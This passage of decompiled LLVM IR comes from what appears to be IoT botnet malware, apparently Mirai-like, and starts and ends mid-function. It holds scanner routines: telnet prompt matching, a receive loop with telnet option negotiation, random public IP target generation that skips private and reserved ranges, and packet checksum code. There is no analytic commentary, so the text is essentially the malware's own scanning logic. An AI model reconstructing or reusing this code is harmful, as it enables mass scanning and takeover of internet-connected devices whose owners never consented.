dec_label_pc_a268:                                ; preds = %dec_label_pc_a254
  br i1 %v7_a274, label %dec_label_pc_a27c, label %dec_label_pc_a288

dec_label_pc_a27c:                                ; preds = %dec_label_pc_a268
  br label %dec_label_pc_a290

dec_label_pc_a288:                                ; preds = %dec_label_pc_a268
  br label %dec_label_pc_a290

dec_label_pc_a290:                                ; preds = %dec_label_pc_a27c, %dec_label_pc_a288
  %storemerge = phi i8 [ -3, %dec_label_pc_a288 ], [ -5, %dec_label_pc_a27c ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a254
  br i1 %v7_a274, label %dec_label_pc_a2b4, label %dec_label_pc_a2c0

dec_label_pc_a2b4:                                ; preds = %dec_label_pc_a2a0
  br label %dec_label_pc_a2c8

dec_label_pc_a2c0:                                ; preds = %dec_label_pc_a2a0
  br label %dec_label_pc_a2c8

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2b4, %dec_label_pc_a2c0
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a2c0 ], [ -4, %dec_label_pc_a2b4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a290, %dec_label_pc_a248, %dec_label_pc_a228, %dec_label_pc_a2c8
  %v5_a2e8 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a210, i32 1, i32 16384)
  %v1_a2f0 = add i32 %arg2, 2
  %v4_a304 = inttoptr i32 %v1_a2f0 to i32*
  %v5_a304 = call i32 @__libc_send(i32 %arg1, i32* %v4_a304, i32 1, i32 16384)
  br label %dec_label_pc_a310

dec_label_pc_a310:                                ; preds = %dec_label_pc_a1d8, %dec_label_pc_a2d4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a310, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a2d4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a2c8, { 1, 0 }
  uselistorder label %dec_label_pc_a290, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a340 = call i32 @strlen(i8* %arg1)
  %v2_a388 = add i32 %v3_a340, %tmp
  br label %dec_label_pc_a45c

dec_label_pc_a360:                                ; preds = %dec_label_pc_a3e8, %dec_label_pc_a3c4, %dec_label_pc_a3a0, %dec_label_pc_a37c
  %v1_a364 = add nsw i32 %stack_var_-24.014, 1
  %v7_a378 = icmp sgt i32 %v3_a340, %v1_a364
  br i1 %v7_a378, label %dec_label_pc_a37c, label %dec_label_pc_a40c

dec_label_pc_a37c:                                ; preds = %dec_label_pc_a36c.preheader, %dec_label_pc_a360
  %stack_var_-24.014 = phi i32 [ %v1_a364, %dec_label_pc_a360 ], [ %stack_var_-24.1, %dec_label_pc_a36c.preheader ]
  %v2_a390 = sub i32 %v2_a388, %stack_var_-24.014
  %v1_a394 = inttoptr i32 %v2_a390 to i8*
  %v2_a394 = load i8, i8* %v1_a394, align 1
  %v2_a398 = icmp eq i8 %v2_a394, 0
  br i1 %v2_a398, label %dec_label_pc_a360, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a37c
  %v2_a3b8 = load i8, i8* %v1_a394, align 1
  %v7_a3bc = icmp eq i8 %v2_a3b8, 32
  br i1 %v7_a3bc, label %dec_label_pc_a360, label %dec_label_pc_a3c4

dec_label_pc_a3c4:                                ; preds = %dec_label_pc_a3a0
  %v2_a3dc = load i8, i8* %v1_a394, align 1
  %v7_a3e0 = icmp eq i8 %v2_a3dc, 13
  br i1 %v7_a3e0, label %dec_label_pc_a360, label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3c4
  %v2_a400 = load i8, i8* %v1_a394, align 1
  %v7_a404 = icmp eq i8 %v2_a400, 10
  br i1 %v7_a404, label %dec_label_pc_a360, label %dec_label_pc_a40c

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3e8, %dec_label_pc_a360, %dec_label_pc_a36c.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a36c.preheader ], [ %stack_var_-24.014, %dec_label_pc_a3e8 ], [ %v1_a364, %dec_label_pc_a360 ]
  %v2_a420 = sub i32 %v2_a388, %stack_var_-24.0.lcssa
  %v1_a424 = inttoptr i32 %v2_a420 to i8*
  %v2_a424 = load i8, i8* %v1_a424, align 1
  %v2_a434 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_1884c.69 to i32)
  %v1_a438 = inttoptr i32 %v2_a434 to i8*
  %v2_a438 = load i8, i8* %v1_a438, align 1
  %v9_a43c = icmp eq i8 %v2_a424, %v2_a438
  %v1_a454 = add i32 %storemerge3, 1
  br i1 %v9_a43c, label %dec_label_pc_a47c, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a40c, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a40c ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a454, %dec_label_pc_a40c ]
  %v3_a464 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1884c.69, i32 0, i32 0))
  %v3_a46c = icmp ult i32 %storemerge3, %v3_a464
  br i1 %v3_a46c, label %dec_label_pc_a36c.preheader, label %dec_label_pc_a47c

dec_label_pc_a36c.preheader:                      ; preds = %dec_label_pc_a45c
  %v7_a37813 = icmp sgt i32 %v3_a340, %stack_var_-24.1
  br i1 %v7_a37813, label %dec_label_pc_a37c, label %dec_label_pc_a40c

dec_label_pc_a47c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a40c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a40c ], [ 0, %dec_label_pc_a45c ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a340, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a40c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a494 = load i32, i32* @fp, align 4
  store i32 %v3_a494, i32* %stack_var_-16, align 4
  %v13_a494 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a4e4 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a524 = udiv i32 %arg1, 32
  %v3_a530 = mul nuw nsw i32 %v3_a524, 4
  %v1_a548 = urem i32 %arg1, 32
  %v6_a550 = shl i32 1, %v1_a548
  %v1_a574 = add i32 %arg1, 1
  %v2_a57c = ptrtoint i32* %stack_var_-176 to i32
  %v6_a69c = inttoptr i32 %arg2 to i8*
  %v2_a6b0 = icmp eq i32 %arg3, 0
  %v1_a6bc = inttoptr i32 %arg6 to i8*
  %v5_a700 = icmp sgt i32 %arg5, 0
  %v2_a538 = add nsw i32 %v3_a530, -152
  %v2_a53c = add i32 %v2_a538, %v13_a494
  %v1_a540 = inttoptr i32 %v2_a53c to i32*
  br label %dec_label_pc_a6d8

dec_label_pc_a4f8.lr.ph:                          ; preds = %dec_label_pc_a6ec, %dec_label_pc_a6f8
  br label %dec_label_pc_a4f8

dec_label_pc_a4f8:                                ; preds = %dec_label_pc_a4f8.lr.ph, %dec_label_pc_a4f8
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a4f8.lr.ph ], [ %v1_a50c, %dec_label_pc_a4f8 ]
  %v5_a504 = mul nuw nsw i32 %storemerge27, 4
  %v6_a504 = add i32 %v5_a504, %v2_a4e4
  %v7_a504 = inttoptr i32 %v6_a504 to i32*
  store i32 0, i32* %v7_a504, align 4
  %v1_a50c = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a50c, 32
  br i1 %tmp30, label %dec_label_pc_a4f8, label %dec_label_pc_a520

dec_label_pc_a520:                                ; preds = %dec_label_pc_a4f8
  %v2_a540 = load i32, i32* %v1_a540, align 4
  %v2_a554 = or i32 %v2_a540, %v6_a550
  store i32 %v2_a554, i32* %v1_a540, align 4
  %v5_a590 = call i32 @__libc_select(i32 %v1_a574, i32 %v2_a4e4, i32 0, i32 0, i32 %v2_a57c)
  %tmp31 = icmp slt i32 %v5_a590, 1
  br i1 %tmp31, label %dec_label_pc_a71c, label %dec_label_pc_a5a0

dec_label_pc_a5a0:                                ; preds = %dec_label_pc_a520
  %v2_a5ac = add i32 %stack_var_-40.0, %arg6
  %v5_a5b0 = inttoptr i32 %v2_a5ac to i8*
  %v6_a5c4 = inttoptr i32 %v2_a5ac to i32*
  %v7_a5c4 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a5c4, i32 1, i32 0, i32 %v2_a5ac)
  %v7_a5d4 = icmp eq i32 %v7_a5c4, -1
  br i1 %v7_a5d4, label %dec_label_pc_a5e8, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_a5a0
  %v2_a5e0 = icmp eq i32 %v7_a5c4, 0
  br i1 %v2_a5e0, label %dec_label_pc_a5e8, label %dec_label_pc_a5f4

dec_label_pc_a5e8:                                ; preds = %dec_label_pc_a5dc, %dec_label_pc_a5a0
  br label %dec_label_pc_a724

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5dc
  %v2_a5fc = add i32 %v7_a5c4, %stack_var_-40.0
  %v2_a608 = load i8, i8* %v5_a5b0, align 1
  %v2_a60c = icmp eq i8 %v2_a608, -1
  br i1 %v2_a60c, label %dec_label_pc_a614, label %dec_label_pc_a694

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5f4
  %v1_a618 = add i32 %v2_a5ac, 1
  %v5_a62c = inttoptr i32 %v1_a618 to i32*
  %v6_a62c = call i32 @__libc_recv(i32 %arg1, i32* %v5_a62c, i32 2, i32 0, i32 %v2_a5fc)
  %v7_a63c = icmp eq i32 %v6_a62c, -1
  br i1 %v7_a63c, label %dec_label_pc_a650, label %dec_label_pc_a644

dec_label_pc_a644:                                ; preds = %dec_label_pc_a614
  %v2_a648 = icmp eq i32 %v6_a62c, 0
  br i1 %v2_a648, label %dec_label_pc_a650, label %dec_label_pc_a65c

dec_label_pc_a650:                                ; preds = %dec_label_pc_a644, %dec_label_pc_a614
  br label %dec_label_pc_a724

dec_label_pc_a65c:                                ; preds = %dec_label_pc_a644
  %v2_a664 = add i32 %v6_a62c, %v2_a5fc
  %v5_a678 = call i32 @negotiate(i32 %arg1, i32 %v2_a5ac, i32 3, i32 %v2_a664, i32 %v2_a664)
  %v2_a680 = icmp eq i32 %v5_a678, 0
  br i1 %v2_a680, label %dec_label_pc_a688, label %dec_label_pc_a6d8

dec_label_pc_a688:                                ; preds = %dec_label_pc_a65c
  br label %dec_label_pc_a724

dec_label_pc_a694:                                ; preds = %dec_label_pc_a5f4
  %v3_a608 = zext i8 %v2_a608 to i32
  %v7_a69c = call i32 @strstr(i32 %arg6, i8* %v6_a69c, i32 %stack_var_-40.0, i32 %v3_a608, i32 %v2_a5fc, i32 %v7_a5c4)
  %v2_a6a4 = icmp eq i32 %v7_a69c, 0
  br i1 %v2_a6a4, label %dec_label_pc_a6ac, label %dec_label_pc_a710

dec_label_pc_a6ac:                                ; preds = %dec_label_pc_a694
  br i1 %v2_a6b0, label %dec_label_pc_a6d8, label %dec_label_pc_a6b8

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a6ac
  %v2_a6bc = call i32 @matchPrompt(i8* %v1_a6bc)
  %v2_a6c4 = icmp eq i32 %v2_a6bc, 0
  br i1 %v2_a6c4, label %dec_label_pc_a6d8, label %dec_label_pc_a710

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a65c, %dec_label_pc_a6b8, %dec_label_pc_a6ac, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a664, %dec_label_pc_a65c ], [ %v2_a5fc, %dec_label_pc_a6ac ], [ %v2_a5fc, %dec_label_pc_a6b8 ]
  %v1_a6dc = add i32 %stack_var_-40.0, 2
  %v6_a6e8 = icmp slt i32 %v1_a6dc, %arg7
  br i1 %v6_a6e8, label %dec_label_pc_a6ec, label %dec_label_pc_a71c

dec_label_pc_a6ec:                                ; preds = %dec_label_pc_a6d8
  %v3_a6ec = load i32, i32* %stack_var_-176, align 4
  %v5_a6f4 = icmp sgt i32 %v3_a6ec, 0
  br i1 %v5_a6f4, label %dec_label_pc_a4f8.lr.ph, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a6ec
  br i1 %v5_a700, label %dec_label_pc_a4f8.lr.ph, label %dec_label_pc_a71c

dec_label_pc_a710:                                ; preds = %dec_label_pc_a694, %dec_label_pc_a6b8
  br label %dec_label_pc_a724

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a520, %dec_label_pc_a6f8, %dec_label_pc_a6d8
  br label %dec_label_pc_a724

dec_label_pc_a724:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a688, %dec_label_pc_a650, %dec_label_pc_a5e8, %dec_label_pc_a71c
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a71c ], [ 1, %dec_label_pc_a710 ], [ 0, %dec_label_pc_a5e8 ], [ 0, %dec_label_pc_a650 ], [ 0, %dec_label_pc_a688 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v6_a62c, { 1, 2, 0 }
  uselistorder i8 %v2_a608, { 1, 0 }
  uselistorder i32 %v2_a5fc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v7_a5c4, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a4e4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a724, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a71c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a710, { 1, 0 }
  uselistorder label %dec_label_pc_a6d8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a4f8, { 1, 0 }
  uselistorder label %dec_label_pc_a4f8.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a738 = load i32, i32* @r4, align 4
  %v6_a738 = load i32, i32* @fp, align 4
  store i32 42816, i32* %stack_var_-4, align 4
  %v2_a73c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a73c, i32* @fp, align 4
  %v0_a744 = call i32 @random()
  %v2_a754 = srem i32 %v0_a744, 223
  %v1_a764 = trunc i32 %v2_a754 to i8
  store i8 %v1_a764, i8* bitcast (i8** @global_var_2287f.71 to i8*), align 4
  %v0_a768 = call i32 @random()
  %v2_a778 = srem i32 %v0_a768, 255
  %v1_a788 = trunc i32 %v2_a778 to i8
  store i8 %v1_a788, i8* @global_var_22880.72, align 1
  %v0_a78c = call i32 @random()
  %v2_a79c = srem i32 %v0_a78c, 255
  %v1_a7ac = trunc i32 %v2_a79c to i8
  store i8 %v1_a7ac, i8* @global_var_22881.73, align 1
  %v0_a7b0 = call i32 @random()
  br label %dec_label_pc_a868

dec_label_pc_a7d8:                                ; preds = %dec_label_pc_aa78, %dec_label_pc_aa68, %dec_label_pc_aa58, %dec_label_pc_aa48, %dec_label_pc_aa38, %dec_label_pc_aa28, %dec_label_pc_aa18, %dec_label_pc_aa08, %dec_label_pc_a9f8, %dec_label_pc_a9e8, %dec_label_pc_a9d8, %dec_label_pc_a9c8, %dec_label_pc_a9b8, %dec_label_pc_a9a8, %dec_label_pc_a998, %dec_label_pc_a968, %dec_label_pc_a948, %dec_label_pc_a918, %dec_label_pc_a8e8, %dec_label_pc_a8c8, %dec_label_pc_a8b8, %dec_label_pc_a8a8, %dec_label_pc_a898, %dec_label_pc_a888, %dec_label_pc_a878, %dec_label_pc_a868
  %v0_a7d8 = call i32 @random()
  %v2_a7e8 = srem i32 %v0_a7d8, 223
  %v1_a7f8 = trunc i32 %v2_a7e8 to i8
  store i8 %v1_a7f8, i8* bitcast (i8** @global_var_2287f.71 to i8*), align 4
  %v0_a7fc = call i32 @random()
  %v2_a80c = srem i32 %v0_a7fc, 255
  %v1_a81c = trunc i32 %v2_a80c to i8
  store i8 %v1_a81c, i8* @global_var_22880.72, align 1
  %v0_a820 = call i32 @random()
  %v2_a830 = srem i32 %v0_a820, 255
  %v1_a840 = trunc i32 %v2_a830 to i8
  store i8 %v1_a840, i8* @global_var_22881.73, align 1
  %v0_a844 = call i32 @random()
  br label %dec_label_pc_a868

dec_label_pc_a868:                                ; preds = %entry, %dec_label_pc_a7d8
  %storemerge7 = phi i32 [ %v0_a7b0, %entry ], [ %v0_a844, %dec_label_pc_a7d8 ]
  %v2_a7c0 = srem i32 %storemerge7, 255
  %extract.t4 = trunc i32 %v2_a7c0 to i8
  store i8 %extract.t4, i8* @global_var_22882.74, align 1
  %v2_a86c = load i8, i8* bitcast (i8** @global_var_2287f.71 to i8*), align 4
  %v3_a86c = zext i8 %v2_a86c to i32
  %v7_a870 = icmp eq i8 %v2_a86c, 127
  br i1 %v7_a870, label %dec_label_pc_a7d8, label %dec_label_pc_a878

dec_label_pc_a878:                                ; preds = %dec_label_pc_a868
  %v2_a880 = icmp eq i8 %v2_a86c, 0
  br i1 %v2_a880, label %dec_label_pc_a7d8, label %dec_label_pc_a888

dec_label_pc_a888:                                ; preds = %dec_label_pc_a878
  %v7_a890 = icmp eq i8 %v2_a86c, 3
  br i1 %v7_a890, label %dec_label_pc_a7d8, label %dec_label_pc_a898

dec_label_pc_a898:                                ; preds = %dec_label_pc_a888
  %v7_a8a0 = icmp eq i8 %v2_a86c, 15
  br i1 %v7_a8a0, label %dec_label_pc_a7d8, label %dec_label_pc_a8a8

dec_label_pc_a8a8:                                ; preds = %dec_label_pc_a898
  %v7_a8b0 = icmp eq i8 %v2_a86c, 16
  br i1 %v7_a8b0, label %dec_label_pc_a7d8, label %dec_label_pc_a8b8

dec_label_pc_a8b8:                                ; preds = %dec_label_pc_a8a8
  %v7_a8c0 = icmp eq i8 %v2_a86c, 56
  br i1 %v7_a8c0, label %dec_label_pc_a7d8, label %dec_label_pc_a8c8

dec_label_pc_a8c8:                                ; preds = %dec_label_pc_a8b8
  %v7_a8d0 = icmp eq i8 %v2_a86c, 10
  br i1 %v7_a8d0, label %dec_label_pc_a7d8, label %dec_label_pc_a8d8

dec_label_pc_a8d8:                                ; preds = %dec_label_pc_a8c8
  %v7_a8e0 = icmp eq i8 %v2_a86c, -64
  br i1 %v7_a8e0, label %dec_label_pc_a8e8, label %dec_label_pc_a8f8

dec_label_pc_a8e8:                                ; preds = %dec_label_pc_a8d8
  %v3_a8ec = load i8, i8* @global_var_22880.72, align 1
  %v7_a8f0 = icmp eq i8 %v3_a8ec, -88
  br i1 %v7_a8f0, label %dec_label_pc_a7d8, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8d8, %dec_label_pc_a8e8
  %v7_a900 = icmp eq i8 %v2_a86c, -84
  br i1 %v7_a900, label %dec_label_pc_a908, label %dec_label_pc_a928

dec_label_pc_a908:                                ; preds = %dec_label_pc_a8f8
  %v3_a90c = load i8, i8* @global_var_22880.72, align 1
  %tmp = icmp ult i8 %v3_a90c, 16
  br i1 %tmp, label %dec_label_pc_a928, label %dec_label_pc_a918

dec_label_pc_a918:                                ; preds = %dec_label_pc_a908
  %tmp19 = icmp ult i8 %v3_a90c, 32
  br i1 %tmp19, label %dec_label_pc_a7d8, label %dec_label_pc_a928

dec_label_pc_a928:                                ; preds = %dec_label_pc_a8f8, %dec_label_pc_a918, %dec_label_pc_a908
  %v7_a930 = icmp eq i8 %v2_a86c, 100
  br i1 %v7_a930, label %dec_label_pc_a938, label %dec_label_pc_a958

dec_label_pc_a938:                                ; preds = %dec_label_pc_a928
  %v3_a93c = load i8, i8* @global_var_22880.72, align 1
  %tmp20 = icmp ult i8 %v3_a93c, 64
  br i1 %tmp20, label %dec_label_pc_a958, label %dec_label_pc_a948

dec_label_pc_a948:                                ; preds = %dec_label_pc_a938
  %tmp21 = icmp ult i8 %v3_a93c, 127
  br i1 %tmp21, label %dec_label_pc_a7d8, label %dec_label_pc_a958

dec_label_pc_a958:                                ; preds = %dec_label_pc_a928, %dec_label_pc_a948, %dec_label_pc_a938
  %v7_a960 = icmp eq i8 %v2_a86c, -87
  br i1 %v7_a960, label %dec_label_pc_a968, label %dec_label_pc_a978

dec_label_pc_a968:                                ; preds = %dec_label_pc_a958
  %v3_a96c = load i8, i8* @global_var_22880.72, align 1
  %v2_a970 = icmp eq i8 %v3_a96c, -1
  br i1 %v2_a970, label %dec_label_pc_a7d8, label %dec_label_pc_a978

dec_label_pc_a978:                                ; preds = %dec_label_pc_a958, %dec_label_pc_a968
  %v7_a980 = icmp eq i8 %v2_a86c, -58
  br i1 %v7_a980, label %dec_label_pc_a988, label %dec_label_pc_a9a8

dec_label_pc_a988:                                ; preds = %dec_label_pc_a978
  %v3_a98c = load i8, i8* @global_var_22880.72, align 1
  %tmp22 = icmp ult i8 %v3_a98c, 18
  br i1 %tmp22, label %dec_label_pc_a9a8, label %dec_label_pc_a998

dec_label_pc_a998:                                ; preds = %dec_label_pc_a988
  %tmp23 = or i8 %v3_a98c, 1
  %tmp24 = icmp eq i8 %tmp23, 19
  br i1 %tmp24, label %dec_label_pc_a7d8, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a978, %dec_label_pc_a998, %dec_label_pc_a988
  %v7_a9b0 = icmp eq i8 %v2_a86c, -32
  br i1 %v7_a9b0, label %dec_label_pc_a7d8, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_a9a8
  %v7_a9c0 = icmp eq i8 %v2_a86c, 6
  br i1 %v7_a9c0, label %dec_label_pc_a7d8, label %dec_label_pc_a9c8

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_a9b8
  %v7_a9d0 = icmp eq i8 %v2_a86c, 7
  br i1 %v7_a9d0, label %dec_label_pc_a7d8, label %dec_label_pc_a9d8

dec_label_pc_a9d8:                                ; preds = %dec_label_pc_a9c8
  %v7_a9e0 = icmp eq i8 %v2_a86c, 11
  br i1 %v7_a9e0, label %dec_label_pc_a7d8, label %dec_label_pc_a9e8

dec_label_pc_a9e8:                                ; preds = %dec_label_pc_a9d8
  %v7_a9f0 = icmp eq i8 %v2_a86c, 21
  br i1 %v7_a9f0, label %dec_label_pc_a7d8, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9e8
  %v7_aa00 = icmp eq i8 %v2_a86c, 22
  br i1 %v7_aa00, label %dec_label_pc_a7d8, label %dec_label_pc_aa08

dec_label_pc_aa08:                                ; preds = %dec_label_pc_a9f8
  %v7_aa10 = icmp eq i8 %v2_a86c, 26
  br i1 %v7_aa10, label %dec_label_pc_a7d8, label %dec_label_pc_aa18

dec_label_pc_aa18:                                ; preds = %dec_label_pc_aa08
  %v7_aa20 = icmp eq i8 %v2_a86c, 28
  br i1 %v7_aa20, label %dec_label_pc_a7d8, label %dec_label_pc_aa28

dec_label_pc_aa28:                                ; preds = %dec_label_pc_aa18
  %v7_aa30 = icmp eq i8 %v2_a86c, 29
  br i1 %v7_aa30, label %dec_label_pc_a7d8, label %dec_label_pc_aa38

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa28
  %v7_aa40 = icmp eq i8 %v2_a86c, 30
  br i1 %v7_aa40, label %dec_label_pc_a7d8, label %dec_label_pc_aa48

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa38
  %v7_aa50 = icmp eq i8 %v2_a86c, 33
  br i1 %v7_aa50, label %dec_label_pc_a7d8, label %dec_label_pc_aa58

dec_label_pc_aa58:                                ; preds = %dec_label_pc_aa48
  %v7_aa60 = icmp eq i8 %v2_a86c, 55
  br i1 %v7_aa60, label %dec_label_pc_a7d8, label %dec_label_pc_aa68

dec_label_pc_aa68:                                ; preds = %dec_label_pc_aa58
  %v7_aa70 = icmp eq i8 %v2_a86c, -42
  br i1 %v7_aa70, label %dec_label_pc_a7d8, label %dec_label_pc_aa78

dec_label_pc_aa78:                                ; preds = %dec_label_pc_aa68
  %v7_aa80 = icmp eq i8 %v2_a86c, -41
  br i1 %v7_aa80, label %dec_label_pc_a7d8, label %dec_label_pc_aa88

dec_label_pc_aa88:                                ; preds = %dec_label_pc_aa78
  %v2_aa88 = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  %v3_aad0 = load i8, i8* @global_var_22880.72, align 1
  %v4_aad0 = zext i8 %v3_aad0 to i32
  store i32 %v4_aad0, i32* @r4, align 4
  %v3_aadc = load i8, i8* @global_var_22881.73, align 1
  %v6_ab04 = sext i8 %v3_aad0 to i32
  %v8_ab04 = sext i8 %v3_aadc to i32
  %v10_ab04 = sext i8 %extract.t4 to i32
  %v15_ab04 = call i32 @szprintf(i32 %v2_aa88, i32 ptrtoint ([12 x i8]* @global_var_18854.76 to i32), i32 %v3_a86c, i32 %v6_ab04, i32 %v8_ab04, i32 %v10_ab04, i32 0, i32 0, i32 0, i32 0)
  store i32 %v2_aa88, i32* @r0, align 4
  %v1_ab10 = call i32 @inet_addr(i32 %v2_aa88)
  store i32 %v3_a738, i32* @r4, align 4
  store i32 %v6_a738, i32* @fp, align 4
  ret i32 %v1_ab10

; uselistorder directives
  uselistorder i32 %v2_aa88, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_22881.73, { 2, 1, 0 }
  uselistorder i8* @global_var_22880.72, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2287f.71 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a978, { 1, 0 }
  uselistorder label %dec_label_pc_a958, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a928, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a8f8, { 1, 0 }
  uselistorder label %dec_label_pc_a868, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ab30 = load i32, i32* @fp, align 4
  %v2_ab44 = load i32, i32* @global_var_28ae4.79, align 4
  %v1_ab4c = call i32 @ntohl(i32 %v2_ab44)
  %v2_ab58 = and i32 %v1_ab4c, %arg1
  %v0_ab60 = call i32 @rand_cmwc()
  %v1_ab6c = sub i32 -1, %arg1
  %v2_ab70 = and i32 %v0_ab60, %v1_ab6c
  %v2_ab78 = xor i32 %v2_ab70, %v2_ab58
  store i32 %v3_ab30, i32* @fp, align 4
  ret i32 %v2_ab78

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_ac089 = icmp sgt i32 %arg2, 1
  br i1 %v8_ac089, label %dec_label_pc_abb8, label %dec_label_pc_ac0c

dec_label_pc_abb8:                                ; preds = %entry, %dec_label_pc_abb8
  %v2_abd4 = phi i32 [ %v2_abd8, %dec_label_pc_abb8 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_abdc, %dec_label_pc_abb8 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_abf8, %dec_label_pc_abb8 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_abf0, %dec_label_pc_abb8 ], [ %arg1, %entry ]
  %v4_abb8 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_abbc = load i8, i8* %stack_var_-32.010, align 1
  %v3_abbc = zext i8 %v2_abbc to i32
  %v1_abc0 = add i32 %v4_abb8, 1
  %v2_abc0 = inttoptr i32 %v1_abc0 to i8*
  %v3_abc0 = load i8, i8* %v2_abc0, align 1
  %v4_abc0 = zext i8 %v3_abc0 to i32
  %v4_abc4 = mul nuw nsw i32 %v4_abc0, 256
  %v5_abc4 = or i32 %v4_abc4, %v3_abbc
  %v2_abd8 = add i32 %v5_abc4, %v2_abd4
  %v3_abd8 = icmp ult i32 %v2_abd8, %v2_abd4
  %v4_abdc = zext i1 %v3_abd8 to i32
  %v5_abdc = add i32 %v4_abdc, %stack_var_-40.012
  %v1_abec = add i32 %v4_abb8, 2
  %v5_abf0 = inttoptr i32 %v1_abec to i8*
  %v1_abf8 = add nsw i32 %stack_var_-36.011, -2
  %v8_ac08 = icmp sgt i32 %v1_abf8, 1
  br i1 %v8_ac08, label %dec_label_pc_abb8, label %dec_label_pc_ac0c

dec_label_pc_ac0c:                                ; preds = %dec_label_pc_abb8, %entry
